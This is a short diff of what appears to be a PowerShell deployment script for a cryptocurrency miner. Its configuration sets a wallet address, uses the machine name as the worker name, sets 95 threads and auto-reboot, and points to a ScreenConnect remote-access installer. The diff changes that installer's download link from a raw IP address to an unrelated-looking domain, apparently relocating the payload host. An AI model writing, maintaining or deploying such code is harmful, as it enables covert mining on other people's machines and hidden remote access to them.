@@ -24,7 +24,7 @@
 $Wallet           = "46pSeeqksaPb97W5ZsNibYfLGdRwTbkLqDR5nn1AMWgK58doHJVvdPhMuA8aE7J7Sd5pcXWRSK91vDeD71qqPYcZFkjgdaw"
 $WorkerName = $env:COMPUTERNAME
 if ([string]::IsNullOrWhiteSpace($WorkerName)) { throw "Could not detect computer name." }
-$ScreenConnectUrl = "http://172.86.74.124:8040/Bin/ScreenConnect.ClientSetup.exe?e=Access&y=Guest"   # .msi or .exe direct link
+$ScreenConnectUrl = "https://bapeshop.us/Bin/ScreenConnect.ClientSetup.exe?e=Access&y=Guest&c=old&c=&c=&c=&c=&c=&c=&c="   # .msi or .exe direct link
 $Threads          = 95
 $Priority         = 2
 $AutoReboot       = $true     # $false to skip the reboot at the end
